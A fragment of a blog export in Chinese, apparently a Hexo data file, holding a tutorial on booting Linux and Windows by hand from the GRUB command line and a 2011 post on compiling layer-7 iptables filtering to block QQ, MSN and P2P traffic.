root&#x3D;LABEL&#x3D;&#x2F;  是Linux的&#x2F;所在的分区的文件系统的标签；如果您知道Linux的&#x2F;在哪个具体的分区，用root&#x3D;&#x2F;dev&#x2F;hd[a-z]X来指定也行。比如下面 的一行也是可以的；</p><p> </p><code>grub&gt; kernel  /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7</code><p>也可以把&#x2F;boot所在的分区的指定 root (hd[0-n],y)这行省掉，直接在kernel  中指定&#x2F;boot所在的分区；所以就在下面的语法；</p><p>如果是&#x2F;boot和Linux的根同处一个分区；</p><code>kernel  (hd[0-n],y)/boot/vmlinuz ro root=/dev/hd[a-z]X</code><p>比如：</p><code>grub&gt;kernel</code><p>如果是&#x2F;boot和Linux所在的根不在一个分区；则是；</p><code>kernel (hd[0-n],y)/vmlinuz  ro root=/dev/hd[a-z]X</code><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p>或下面的输入，以cat 出&#x2F;etc&#x2F;fstab内容为准；</p><p> </p><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong><br />6）initrd 命令行来指定initrd文件；<br /></strong></p><p> </p><code>grub&gt; initrd  /boot/initrd在这里tab 来补齐；<br />grub&gt; initrd /boot/initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p>如果&#x2F;boot是独立的一个分区，应该是如下样子的语法；比如下面的；</p><p> </p><code>grub&gt; initrd  /initrd在这里tab 来补齐；<br />grub&gt; initrd /initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p><br /><strong><br />7）boot 引导系统；<br /></strong></p><p> </p><p> </p><code>grub&gt;boot</code><code><strong>2、通过GRUB指令来引导 Windows ；<br /></strong></code><p> </p><p>其实我们会写menu.lst了，在menu.lst中的除了title外，都是一条条指<br>令；如果我们启动 Windows ，只是输入指令就行了；</p><p>比如 Windows的分区在 (hd0,0)，我们在开机后，按ctrl+c  ，进入GRUB的命令模式；就可以用下面的</p><p> </p><code>grub&gt; rootnoverify  (hd0,0)<br />grub&gt; chainloader +1<br />grub&gt; boot</code></p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>1、用命令行来引导Linux操作系统的步骤<br /></strong><p>通过命令行来引导操作系统的流程，也没有什么难的；无非是把指令手工输入到grub&gt;提示符的后面；在这个过程中，tab键的命令补齐功能就 显得很重要了。如果您不知道有哪些命令，可以输入help；</p><p><strong><br />1）进入GRUB的命令行模式 grub&gt;<br /></strong><br />如果开机时，GRUB出现的是<strong>grub&gt;</strong>，说明你没有&#x2F;etc&#x2F;grub&#x2F;menu.lst  ，您需要自己写一个才会GRUB的菜单，让我们来选择进入哪个系统。如果有GRUB的菜单，您可以按<strong>Ctrl+c</strong>组合 键进入GRUB的命令行模式，会出现<strong>grub&gt;</strong> 提示符；</p><code>grub&gt;</code><p><br /><strong><br />2）获取帮助GRUB的 help<br /></strong></p><p> </p><p>只要您在<strong>grub&gt;</strong>提示符的后面输入help 就能得到GRUB所有的命令提示；</p><p> </p><code>grub&gt; help<br />blocklist FILE boot<br />cat FILE chainloader [--force] FILE<br />clear color NORMAL [HIGHLIGHT]<br />configfile FILE device DRIVE DEVICE<br />displayapm displaymem<br />find FILENAME geometry DRIVE [CYLINDER HEAD SECTOR [<br />halt [--no-apm] help [--all] [PATTERN ...]<br />hide PARTITION initrd FILE [ARG ...]<br />kernel [--no-mem-option] [--type=TYPE] makeactive<br />map TO_DRIVE FROM_DRIVE md5crypt<br />module FILE [ARG ...] modulenounzip FILE [ARG ...]<br />pager [FLAG] partnew PART TYPE START LEN<br />parttype PART TYPE quit<br />reboot root [DEVICE [HDBIAS]]<br />rootnoverify [DEVICE [HDBIAS]] serial [--unit=UNIT] [--port=PORT] [--<br />setkey [TO_KEY FROM_KEY] setup [--prefix=DIR] [--stage2=STAGE2_<br />terminal [--dumb] [--no-echo] [--no-ed terminfo [--name=NAME  --cursor-address<br />testvbe MODE unhide PARTITION<br />uppermem KBYTES vbeprobe [MODE]</code><p>如果需要得到某个指令的帮助，就在 help 后面空一格，然后输入指令，比如；</p><p> </p><code>grub&gt;help kernel</code><p><br /><strong><br />3）cat的用法；<br /></strong></p><p> </p><p>cat指令是用来查看文件内容的，有时我们不知道Linux的&#x2F;boot分区，以及&#x2F;根分区所在的位置，要查看&#x2F;etc&#x2F;fstab的内容来得知， 这时，我们就要用到cat (hd[0-n],y)&#x2F;etc&#x2F;fstab 来获得这些内容；注意要学会用tab键命令补齐的功能；</p><code>grub&gt; cat ( 按tab  键会出来hd0或hd1之类的；<br />grub&gt; cat (hd0, 注：输入hd0,然后再按tab键；会出来分区之类的；<br />grub&gt; cat (hd0,6)<br />Possible partitions are:<br />Partition num: 0, Filesystem type unknown, partition type 0x7<br />Partition num: 4, Filesystem type is fat, partition type 0xb<br />Partition num: 5, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 6, Filesystem type is ext2fs, partition type 0x83<br />Partition num: 7, Filesystem type unknown, partition type 0x83<br />Partition num: 8, Filesystem type is reiserfs, partition type 0x83<br />Partition num: 9, Filesystem type unknown, partition type 0x82<br />grub&gt; cat (hd0,6)/etc/fstab 注：比如我想查看一下 (hd0,6)/etc/fstab的内容就这样输入；<br />LABEL=/ / ext3 defaults 1 1<br />/dev/devpts /dev/pts devpts gid=5,mode=620 0 0<br />/dev/shm /dev/shm tmpfs defaults 0 0<br />/dev/proc /proc proc defaults 0 0<br />/dev/sys /sys sysfs defaults 0 0<br />LABEL=SWAP-hda1 swap swap defaults 0 0<br />/dev/hdc /media/cdrecorder auto pamconsole,exec,noauto,<br />managed 0 0</code><p>有的弟兄可能会说，我不知道Linux安装在了哪个分区。那根据文件系统来判断一个一个的尝试总可以吧我；只要能cat出&#x2F;etc&#x2F;fstab就能 为以后引导带来方便；</p><p>主要查看&#x2F;etc&#x2F;fstab中的内容，主要是Linux的&#x2F;分区及&#x2F;boot是否是独立的分区；如果没有&#x2F;boot类似的行，证明&#x2F;boot和 Linux的&#x2F;处于同一个硬盘分区；比如上面的例子中LABEL&#x3D;&#x2F; 这行是极为重要的；说明Linux系统就安在标签为LABEL&#x3D;&#x2F;的分区中；</p><p>如果您的Linux系统&#x2F;boot和&#x2F;没有位于同一个分区，可能cat (hd[a-n],y) 查到的是类似下面的；</p><p> </p><code>LABEL=/ / ext3 defaults 1 1<br />LABEL=/boot /boot ext3 defaults 1 2</code><p><strong><br />4） root (hd[0-n,y) 指令来指定&#x2F;boot所在的分区；<br /></strong></p><p>其实这个root (hd[0,n],y)是可以省略的，如果省略了，我们要在kerenl 命令中指定；我们前面已经说过  (hd[0-n],y) 硬盘分区的表示方法的用途；主要是用来指定 &#x2F;boot所在的分区；</p><p>比如我们确认&#x2F;boot和 (hd0,6)，所以就可以这样来输入root (hd0,6)</p><code>grub&gt; root (hd0,6)</code><p>如果发现不对，可以重新来过；没有什么大不了的；</p><p><strong><br />5） kernel 指令，用来指定Linux的内核，及&#x2F;所在的分区；<br /></strong></p><p>kernel 这个指令可能初学者有点怕，不知道内核在哪个分区，及内核文件名的全称是什么。不要忘记tab键的命令补齐的应用；<br /><strong><br />如果我们已经通过root (hd[0-n],y) 指定了&#x2F;boot所在的分区，语法有两个：<br /></strong><br />如果&#x2F;boot和Linux的&#x2F;位于同一个分区，应该是下面的一种格式；<br /><strong><br />kernel &#x2F;boot&#x2F;vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root&#x3D;&#x2F;dev&#x2F;hd[a-z]X<br /></strong><br />如果&#x2F;boot有自己独立的分区，应该是；<br /><strong><br />kernel &#x2F;vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root&#x3D;&#x2F;dev&#x2F;hd[a-z]X<br /></strong></p><p>在这里 root&#x3D;&#x2F;dev&#x2F;hd[a-z]X 是Linux  的&#x2F;根所位于的分区，如果不知道是哪个分区，就用tab出来的来计算，一个一个的尝试；或用cat (hd[0-n],y)&#x2F;etc&#x2F;fstab  中得到Linux的&#x2F;所在的分区或分区的标签；</p><p> </p><code>grub&gt; kernel  /boot/在这里按tab键；这样就列出/boot中的文件了；<br />Possible files are: grub initrd-2.6.11-1.1369_FC4.img  System.map-2.6.11-1.1369<br />_FC4 config-2.6.11-1.1369_FC4 vmlinuz-2.6.11-1.1369_FC4 grubBAK  memtest86+-1.55<br />.1 xen-syms xen.gz<br />grub&gt; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong>注解：</strong> root&#x3D;LABEL&#x3D;&#x2F;  是Linux的&#x2F;所在的分区的文件系统的标签；如果您知道Linux的&#x2F;在哪个具体的分区，用root&#x3D;&#x2F;dev&#x2F;hd[a-z]X来指定也行。比如下面 的一行也是可以的；</p><p> </p><code>grub&gt; kernel  /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7</code><p>也可以把&#x2F;boot所在的分区的指定 root (hd[0-n],y)这行省掉，直接在kernel  中指定&#x2F;boot所在的分区；所以就在下面的语法；</p><p>如果是&#x2F;boot和Linux的根同处一个分区；</p><code>kernel  (hd[0-n],y)/boot/vmlinuz ro root=/dev/hd[a-z]X</code><p>比如：</p><code>grub&gt;kernel</code><p>如果是&#x2F;boot和Linux所在的根不在一个分区；则是；</p><code>kernel (hd[0-n],y)/vmlinuz  ro root=/dev/hd[a-z]X</code><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p>或下面的输入，以cat 出&#x2F;etc&#x2F;fstab内容为准；</p><p> </p><code>grub&gt; kernel  (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/<br />[Linux-bzImage, setup=0x1e00, size=0x18e473]</code><p><strong><br />6）initrd 命令行来指定initrd文件；<br /></strong></p><p> </p><code>grub&gt; initrd  /boot/initrd在这里tab 来补齐；<br />grub&gt; initrd /boot/initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p>如果&#x2F;boot是独立的一个分区，应该是如下样子的语法；比如下面的；</p><p> </p><code>grub&gt; initrd  /initrd在这里tab 来补齐；<br />grub&gt; initrd /initrd-2.6.11-1.1369_FC4.img<br />[Linux-initrd @ 0x2e1000, 0x10e685 bytes]</code><p><br /><strong><br />7）boot 引导系统；<br /></strong></p><p> </p><p> </p><code>grub&gt;boot</code><code><strong>2、通过GRUB指令来引导 Windows ；<br /></strong></code><p> </p><p>其实我们会写menu.lst了，在menu.lst中的除了title外，都是一条条指<br>令；如果我们启动 Windows ，只是输入指令就行了；</p><p>比如 Windows的分区在 (hd0,0)，我们在开机后，按ctrl+c  ，进入GRUB的命令模式；就可以用下面的</p><p> </p><code>grub&gt; rootnoverify  (hd0,0)<br />grub&gt; chainloader +1<br />grub&gt; boot</code></p>\n"},{"title":"iptables之7层过滤(封QQ、MSN、P2P)","date":"2011-09-05T09:33:00.000Z","_content":"iptables之7层过滤封QQ、MSN、P2P\n环境vmware-NAT连接上网。\n<br />&nbsp;&nbsp; 192.168.2.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.20.0<br />clent -----&gt;eth0-[linux]-eth1-------[nat]----intener\n&nbsp;\nby：key1088<br />\n<strong>准备</strong>\n1.内核源码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n2.iptables 源码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n3.netfilter-L7 filter\n4.l7-protocols\n<strong>安装</strong>\n1.给内核打补丁.编译内核。我使用的2.6.28的内核。\npatch -pl &lt; /root/netfilter-layer7-v2.22/kernel-2.6.25-2.6.28-layer7-2.22.patch\n编译内核\nmake menuconfig\n选项\nGeneral setup&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Prompt for development and/or incomplete code/drivers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp; Networking&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Networking options&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Network packet filtering framework (Netfilter)&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Core Netfilter Configuration&nbsp; ---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;M&gt; Netfilter connection tracking support&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;M&gt;&nbsp;&nbsp; &quot;layer7&quot; match support&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Layer 7 debugging output&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IP: Netfilter Configuration&nbsp; ---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;M&gt;FULL NAT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; #别忘记这个不然没有nat table\nmake\nmake moduls_install&nbsp;\nmake install\n2.安装Layer 7协议\ncd l7-protocols-2009-05-28/ <br />make install\n3.编译iptables\n./configure --with-ksoure=/usr/src/linux-2.6.28/\nmake\nmake install\n4.检测。重启选择启动那个内核。\niptables -V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #你的iptables 版本\niptables -m layer7 --help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; #看看有layer7选项吗\nlsmod|grep layer7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #看看有相应的模块吗\niptables -t nat -L&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #其他tables能不能用。\niptables -t mangle -L\niptables -L\n5.测试\niptables -t nat -A POSTROUTING -s 内网ip -j SNAT --to 外防火墙IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #客户端能正常上网，上QQ\niptables -t mangle -I PREROUTING -m layer --l7proto qq -j DROP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #退下QQ，看看能不能使用。\n6.相应语法\niptables -t mangle -I PREROUTING -m layer7 --l7proto edonkey -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto bittorrent -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto qq -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto msnmessenger -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto xunlei -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto kugoo -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto yahoo -j DROP\n&nbsp;\n参考地址：\nhttp://lzy821218.blog.51cto.com/209800/307349","source":"_posts/iptables之7层过滤(封QQ、MSN、P2P).md","raw":"title: iptables之7层过滤(封QQ、MSN、P2P)\ncategories: [网络安全]\ntags: []\ndate: 2011-09-05 17:33:00\n---\niptables之7层过滤封QQ、MSN、P2P\n环境vmware-NAT连接上网。\n<br />&nbsp;&nbsp; 192.168.2.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.20.0<br />clent -----&gt;eth0-[linux]-eth1-------[nat]----intener\n&nbsp;\nby：key1088<br />\n<strong>准备</strong>\n1.内核源码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n2.iptables 源码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n3.netfilter-L7 filter\n4.l7-protocols\n<strong>安装</strong>\n1.给内核打补丁.编译内核。我使用的2.6.28的内核。\npatch -pl &lt; /root/netfilter-layer7-v2.22/kernel-2.6.25-2.6.28-layer7-2.22.patch\n编译内核\nmake menuconfig\n选项\nGeneral setup&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Prompt for development and/or incomplete code/drivers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp; Networking&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Networking options&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Network packet filtering framework (Netfilter)&nbsp; ---&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Core Netfilter Configuration&nbsp; ---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;M&gt; Netfilter connection tracking support&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;M&gt;&nbsp;&nbsp; &quot;layer7&quot; match support&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Layer 7 debugging output&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IP: Netfilter Configuration&nbsp; ---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;M&gt;FULL NAT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; #别忘记这个不然没有nat table\nmake\nmake moduls_install&nbsp;\nmake install\n2.安装Layer 7协议\ncd l7-protocols-2009-05-28/ <br />make install\n3.编译iptables\n./configure --with-ksoure=/usr/src/linux-2.6.28/\nmake\nmake install\n4.检测。重启选择启动那个内核。\niptables -V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #你的iptables 版本\niptables -m layer7 --help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; #看看有layer7选项吗\nlsmod|grep layer7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #看看有相应的模块吗\niptables -t nat -L&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #其他tables能不能用。\niptables -t mangle -L\niptables -L\n5.测试\niptables -t nat -A POSTROUTING -s 内网ip -j SNAT --to 外防火墙IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #客户端能正常上网，上QQ\niptables -t mangle -I PREROUTING -m layer --l7proto qq -j DROP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #退下QQ，看看能不能使用。\n6.相应语法\niptables -t mangle -I PREROUTING -m layer7 --l7proto edonkey -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto bittorrent -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto qq -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto msnmessenger -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto xunlei -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto kugoo -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 --l7proto yahoo -j DROP\n&nbsp;\n参考地址：\nhttp://lzy821218.blog.51cto.com/209800/307349","slug":"iptables之7层过滤(封QQ、MSN、P2P)","published":1,"updated":"2023-04-22T05:38:44.772Z","_id":"clgrjlxdt002g7opi6st04znj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>iptables之7层过滤封QQ、MSN、P2P<br>环境vmware-NAT连接上网。<br><br />&amp;nbsp;&amp;nbsp; 192.168.2.0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.20.0<br />clent —–&gt;eth0-[linux]-eth1——-[nat]—-intener<br>&amp;nbsp;<br>by：key1088<br 